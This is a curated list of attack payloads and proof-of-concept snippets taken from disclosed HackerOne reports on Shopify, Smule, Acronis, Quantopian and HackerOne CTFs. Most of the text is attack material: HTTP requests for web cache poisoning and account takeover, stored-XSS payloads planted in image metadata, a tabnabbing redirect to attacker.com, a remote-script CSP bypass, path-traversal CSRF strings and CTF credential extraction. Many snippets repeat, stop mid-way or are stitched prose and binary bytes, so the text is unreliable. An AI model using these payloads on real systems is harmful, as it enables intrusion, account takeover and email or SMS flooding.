# Violation of Secure Design Principles  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#780285](https://hackerone.com/reports/780285)  -  [h1-415 2020] H1-415 CTF Writeup by W--
*critical*

```http
POST /register HTTP/1.1
Host: h1-415.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Cookie: _csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384; session=eyJfY3NyZl90b2tlbiI6IjQwNzg0OW…

name=demo&email=jobert%40mydocz.cosmic<<<&username=demo&password=password123&password-confirmation=password123&_csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384
```

## 2. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```http
POST /accounts/141376700 HTTP/1.1
Host: accounts.shopify.com
Referer: https://accounts.shopify.com/accounts/141376700
Content-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951
Content-Length: 13530
Origin: https://accounts.shopify.com
Cookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _…
```

## 3. [#280534](https://hackerone.com/reports/280534)  -  No Rate Limit on account deletion request(Leads to huge email flooding/email bombing)
*low*

```http
POST /api/requests/account_delete HTTP/1.1
Host: infogram.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Cookie: ab=a11; _ga=GA1.2.229897234.1508421432; _paths=https%3A%2F%2Finfogram.com%2F%2Chttps%3A%2F%2…

_csrf=ChZ8Uvl8-yz07Pxjz87VrMV4wMbMTi8JmELI
```

## 4. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```http
POST /accounts/141376700 HTTP/1.1
Host: accounts.shopify.com
Referer: https://accounts.shopify.com/accounts/141376700
Content-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951
Content-Length: 13530
Origin: https://accounts.shopify.com
Cookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _…

-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="utf8"

â
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="_method"

patch
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="authenticity_token"

0HXXr+2RHm5QwSvfF4MkpkyouUXgM8Dl/xxxxxx+w+78GWOFVLxSqTOpswgegMl3DgEgKHsV5Qw==
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="account[avatar]"; filename="xss_comment_exif_metadata_double_quote.png"
Content-Type: text/html

PNG

```

## 5. [#504514](https://hackerone.com/reports/504514)  -  Web cache poisoning leads to disclosure of CSRF token and sensitive information
*medium*

```http
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banne…
```

## 6. [#504514](https://hackerone.com/reports/504514)  -  Web cache poisoning leads to disclosure of CSRF token and sensitive information
*medium*

```http
GET /s/smule_groups/user_groups/fossnow27 HTTP/1.1
Host: www.smule.com
X-Forwarded-Host: localhost
Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banne…

'''
```

## 7. [#1010858](https://hackerone.com/reports/1010858)  -  Web cache poisoning at www.acronis.com
*medium*

```http
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
Origin: https://yig1bt7ai4.com
```

## 8. [#1010858](https://hackerone.com/reports/1010858)  -  Web cache poisoning at www.acronis.com
*medium*

```http
GET /zh-cn/careers/ HTTP/1.1
Host: www.acronis.com
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
```

## 9. [#1010858](https://hackerone.com/reports/1010858)  -  Web cache poisoning at www.acronis.com
*medium*

```http
GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
Host: www.acronis.com
Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
```

## 10. [#700075](https://hackerone.com/reports/700075)  -  bypass captcha in the form forgot password
*low*

```http
POST /forgot_password HTTP/1.1
Host: affiliate.kartpay.com
Referer: https://affiliate.kartpay.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Cookie: XSRF-TOKEN=eyJpdiI6IjhjXC8zMFBQT3VFZW5VS2ZHSmVlRk1RPT0iLCJ2YWx1ZSI6Img2SjVsNHdhclVnaEI4dThmM…

_token=hIfAxen5jTB2IcWjjpkxAjb1j9Ro8nPtyhveLdoT&email=test%40gmail.com
```

## 11. [#854793](https://hackerone.com/reports/854793)  -  No rate limiting for confirmation email lead to email flooding and leads to enumeration of emails in publishers.basicattentiontoken.org
*low*

```http
POST /publishers HTTP/1.1
Host: publishers.basicattentiontoken.org
Referer: https://publishers.basicattentiontoken.org/publishers/settings
X-CSRF-Token: K3ImpMdB22SFYupK9nbc9IEubpRgmVTYVKQ/HnPFcbglcbkSKBb5wdJ4GCx436E1TuPddMUZR0u5Nh0f9r6pJQ==
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------115523927333677217472699996749
Origin: https://publishers.basicattentiontoken.org
Content-Length: 466
```

## 12. [#2166697](https://hackerone.com/reports/2166697)  -  Ability to bulk submit reports via query named based batching
*low, $500*

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie)
Content-Length: 1173
X-Csrf-Token: {your-csrf-token}
Content-Type: application/json
Origin: https://hackerone.com

{
"operationname": "CreateReport",
"variables":{
"team_handle":"{target-team-handle}",
"product_area":"reports",
"product_feature":"inbox"
},
  "query": "{your-generated-query}"
}
```

## 13. [#504514](https://hackerone.com/reports/504514)  -  Web cache poisoning leads to disclosure of CSRF token and sensitive information
*medium*

```http
POST /user/check_email HTTP/1.1
Host: localhost
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: █████████=
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: https://www.smule.com

email=foo%40bar.com
```

## 14. [#272379](https://hackerone.com/reports/272379)  -  Password reset token leak on third party website via Referer header
*medium*

```http
GET /rtfd/readthedocs.org HTTP/1.1
Host: github.com
Referer: https://readthedocs.org/accounts/password/reset/key/1zp5-4pt-8163732eb05d188994ec/
Cookie: COOKIE
```

## 15. [#906790](https://hackerone.com/reports/906790)  -  Account Takeover on unverified emails in File Sync & Share
*medium*

```http
PUT /fc/api/v1/account HTTP/1.1
Host: mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/fc/access
Content-Type: application/json;charset=utf-8
X-CSRF-Token: L+0MN5lQqnozdt86Ot276c10PuwLrvpSCK0MrInGkuz5Ei29eyEy8VN37jELA+CwUFHWbEZq3oOv3CUpJMKNvA==
Content-Length: 74
Cookie: NodesTable_state=%7B%22columnInfo%22%3A%7B%7D%7D; host="https://mc-beta-cloud.acronis.com"; …

{"name":"Staff Member","email":"0xcrypto+staffmember1@wearehackerone.com"}
```

## 16. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```javascript
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

## 17. [#2166697](https://hackerone.com/reports/2166697)  -  Ability to bulk submit reports via query named based batching
*low, $500*

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: {your-h1-cookie)
Content-Length: 1173
X-Csrf-Token: {your-csrf-token}
Content-Type: application/json
```

## 18. [#263010](https://hackerone.com/reports/263010)  -  Improper validation at Phone verification (possible cost increase + SMS SPAM attack)
*low*

```http
POST /apiv2/user/verifytelephone HTTP/1.1
Host: unikrn.com
Referer: https://unikrn.com/profile
Content-Type: application/json
Content-Length: 60
Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff

{"session_id":"lcso6bc6vv2jcf7ebukdfgrfm3s38v6a","resend":1}
```

## 19. [#263010](https://hackerone.com/reports/263010)  -  Improper validation at Phone verification (possible cost increase + SMS SPAM attack)
*low*

```http
POST /apiv2/user/verifytelephone HTTP/1.1
Host: unikrn.com
Referer: https://unikrn.com/profile
Content-Type: application/json
Content-Length: 60
Cookie: __cfduid=d4df1b78e117c6c9c5fd1fdd774c758ed1503574524; CW=hkp8at5qvoeijvet63q3iei9qcsn7dff

{"session_id":"lcso6bc6vv2jcf7ebukdfgrfm3s38v6a","resend":§1§}
```

## 20. [#262830](https://hackerone.com/reports/262830)  -  Rate-limit protection get executed in the last stage of the registration process, allowing enumeration of existing account.
*low*

```http
POST /apiv1/register HTTP/1.1
Host: unikrn.com
Referer: https://unikrn.com/
Content-Type: application/json
Content-Length: 161
Cookie: [Long Cookie CUT]

{"email_address":"hackerone1@gmail.com","day":"1","month":"1","year":"1999","state":null,"password":"a12345678","password_confirm":"a12345678","session_id":null}
```

## 21. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 22. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
```

## 23. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com
```

## 24. [#895587](https://hackerone.com/reports/895587)  -  [H1-2006 2020] How I solved my first H1 CTF
*critical*

```
../../../../../redirect?url=https://software.bountypay.h1ctf.com/
```

## 25. [#906790](https://hackerone.com/reports/906790)  -  Account Takeover on unverified emails in File Sync & Share
*medium*

```http
PUT /fc/api/v1/account HTTP/1.1
Host: mc-beta-cloud.acronis.com
Referer: https://mc-beta-cloud.acronis.com/fc/access
Content-Type: application/json;charset=utf-8
```

## 26. [#764122](https://hackerone.com/reports/764122)  -  No Rate Limiting on /reset-password-request/ endpoint
*medium*

```http
POST /██████████
Host: my.stripo.email
Referer: ████████
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
```

## 27. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```bash
$ curl https://app.bountypay.h1ctf.com/bp_web_trace.log
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

## 28. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```bash
$ curl -s https://app.bountypay.h1ctf.com/bp_web_trace.log | awk -F ':' '{print $2}' | while read line; do echo "$line" | base64 --decode && echo "\n"; done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}

{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}

{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

## 29. [#210875](https://hackerone.com/reports/210875)  -  use of unsafe host header leads to open redirect
*low*

```http
GET /feed/102126489/activity/3073813190982488067/share/Person/getcontent?_=1488723542848 HTTP/1.1
Host: socialclub.rockstargames.com
```

## 30. [#210875](https://hackerone.com/reports/210875)  -  use of unsafe host header leads to open redirect
*low*

```http
GET /feed/102126489/activity/2960911889698885091/share/Person/getcontent?_=1488725310707 HTTP/1.1
Host: socialclub.rockstargames.com.this.is.my.domain.evil.net
```

## 31. [#728664](https://hackerone.com/reports/728664)  -  Cache poisoning DoS to various TTS assets
*high*

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'https://federation.data.gov/?cb=xxx'
```

## 32. [#780285](https://hackerone.com/reports/780285)  -  [h1-415 2020] H1-415 CTF Writeup by W--
*critical*

```html
<script src="https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fw--/a/master/csp-done19.js"></script>
```

## 33. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```java
if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        str = sharedPreferences.getString("USERNAME", "");
        SharedPreferences.Editor editor = sharedPreferences.edit();
        String str1 = sharedPreferences.getString("TWITTERHANDLE", "");
        editor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, str1);
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    }
```

## 34. [#895587](https://hackerone.com/reports/895587)  -  [H1-2006 2020] How I solved my first H1 CTF
*critical*

```
../../../../../#
```

## 35. [#895587](https://hackerone.com/reports/895587)  -  [H1-2006 2020] How I solved my first H1 CTF
*critical*

```
../../../../../redirect?url=software.bountypay.h1ctf.com/#
```

## 36. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```html
<script>alert(prompt('XSS BY ZEROX4'))</script>
```

## 37. [#280500](https://hackerone.com/reports/280500)  -  Tabnabbing via window.opener
*low*

```html
<script>
if (window.opener) window.opener.parent.location.replace('http://attacker.com');
if (window.parent != window) window.parent.location.replace('http://attacker.com');
</script>
```

## 38. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```bash
cat ./SecLists/Discovery/Web-Content/common.txt | while read line; do ./soft-urls.sh "https://software.bountypay.h1ctf.com/${line}?"; done > fuzz-urls-encoded.txt

ffuf -w fuzz-urls-encoded.txt -u "https://app.bountypay.h1ctf.com/statements/?month=04&year=2020" -H "Cookie: token=FUZZ" -fw 5
```

## 39. [#895587](https://hackerone.com/reports/895587)  -  [H1-2006 2020] How I solved my first H1 CTF
*critical*

```
If the server tried to contact to my VPN that means that exists a HTML input with name starting with c. 

So doing this, I obtained that there were 7 inputs: code_1 to code_7. 

Ok, so the final idea was to generate a CSS file with all conditions and codes, so if the server tried to contact with the Burp Collaborator, the input value would show up.

So coding a Python script like this
```

## 40. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```
exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
```

## 41. [#964550](https://hackerone.com/reports/964550)  -  XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
*low*

```
�PNG
�
IHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment"><script>alert(prompt('XSS BY ZEROX4'))</script>
                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�
```

## 42. [#280500](https://hackerone.com/reports/280500)  -  Tabnabbing via window.opener
*low*

```html
<html>
<script>
if (window.opener) window.opener.parent.location.replace('http://attacker.com');
if (window.parent != window) window.parent.location.replace('http://attacker.com');
</script>
blah
</html>
```

## 43. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```java
public void submitInfo(View paramView) {
    final String post = ((EditText)findViewById(2131230834)).getText().toString();
    this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
          public void onCancelled(DatabaseError param1DatabaseError) {
            Log.e("PartTwoActivity", "onCancelled", (Throwable)param1DatabaseError.toException());
          }
          
          public void onDataChange(DataSnapshot param1DataSnapshot) {
            tring str1 = (String)param1DataSnapshot.getValue();
            SharedPreferences sharedPreferences = PartTwoActivity.this.getSharedPreferences("user_created", 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            String str2 = post;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-");
            stringBuilder.append(str1);
            if (str2.equals(stringBuilder.toString())) {
              str1 = sharedPreferences.getString("USERNAME", "");
              String str = sharedPreferences.getString("TWITTERHANDLE", "");
              PartTwoActivity.this.logFlagFound(str1, str);
              editor.putString("PARTTWO", "COMPLETE").apply();
              PartTwoActivity.this.correctHeader();
              return;
            } 
            Toast.makeText((Context)PartTwoActivity.this, "Try again! :D", 0).show();
          }
        });
  }
# … truncated …
```

## 44. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```
../../../../
```

## 45. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```
../../../../../users/update_preferences?prefs%5Bsend_login_detected_email%5D=false
```

## 46. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```
../../../../../users/update_profile?firstname=h1&lastname=test&bio=hi#
```

## 47. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```
../../../
```

## 48. [#780285](https://hackerone.com/reports/780285)  -  [h1-415 2020] H1-415 CTF Writeup by W--
*critical*

```
document.write("<hr><iframe src='http://localhost:9222/' width='900' height='1000'></iframe>");
```

## 49. [#780285](https://hackerone.com/reports/780285)  -  [h1-415 2020] H1-415 CTF Writeup by W--
*critical*

```http
Getting the first part of this vulnerability working was actually fairly trivial except for the fact that I initially missed the feedback dialog option.  With the ability to cause arbitrary HTML content to sent to the "support team", it seemed pretty clear that we would need to take over their session to gain additional privileges on the `My Docz` system.  To take over a session though, we would almost certainly need Javascript execution.

Back at the support chat page, I noticed that while it appeared I had a XSS vulnerability, my browser wasn't actually executing any Javascript payloads.  Instead, all Javascript was being blocked due to the server's Content Security Policy (CSP).  Looking at the response headers, the following CSP rules are set by the server:
```

## 50. [#894863](https://hackerone.com/reports/894863)  -  [H1-2006 2020] From multiple vulnerabilities to complete ATO on any customer account and staff admin
*critical*

```
HTTP/1.1 400 Bad Request
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 18:29:09 GMT
Content-Type: application/json
Connection: close
Content-Length: 21

["Missing Parameter"]
```

## 51. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```json
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/update_preferences?prefs%5Bsend_login_detected_email%5D=false","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

## 52. [#837328](https://hackerone.com/reports/837328)  -  Ability to perform various POST requests on quantopian.com as a different user - insecure by design.
*low, $1,050*

```json
{"type":"form-update","element":"#algo-id","value":"/../../../../../users/update_profile?firstname=h1&lastname=test&bio=hi#","clientId":"x","roomId":"5ce6e50b298f7c6e0acb68c6"}
```

## 53. [#895587](https://hackerone.com/reports/895587)  -  [H1-2006 2020] How I solved my first H1 CTF
*critical*

```
Furthermore, profile upload let user to upload both profile name and avatar. The avatar div had a class name #avatar(1|2|3) too and this last parameter was vulnerable to injection, so, changing the avatar in the request previous tampering and adding **upgradeToAdmin** and **tab4** class...so doing this:

{F862615}

I had this functionallity, but I need to be admin to be admin... So I needed to report something wrong...but what?

And after many smoke over my head, I thought on HTTP Parameter Pollution.

Doing the following request:

https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4

{F862622}

I broke the page.

{F862640}

Finally, I had to base64-encode this payload and send it to one admin, doing the following request:

{F862656}

I obtained a new tab on home dashboard with our friend, marten.mickos user and password:

{F862661}

Finally, with this info, I got ready to help our favourite H1 CEO

##  FINAL BOSS: APP AGAIN T_T

Using the same technique as the other user I landed on APP site profile of Marten. Doing some searching, I found a payment.

{F862679}

So I pushed the button "Pay" and other page came to me:
# … truncated …
```

## 54. [#661051](https://hackerone.com/reports/661051)  -  Message Authentication Codes calculated by the Default Encryption Module allow an attacker to silently overwrite blocks in a file
*low*

```
php -r 'print(str_repeat("A", 6072*10).str_repeat("B", 6072)."1");' >./collision.txt
```
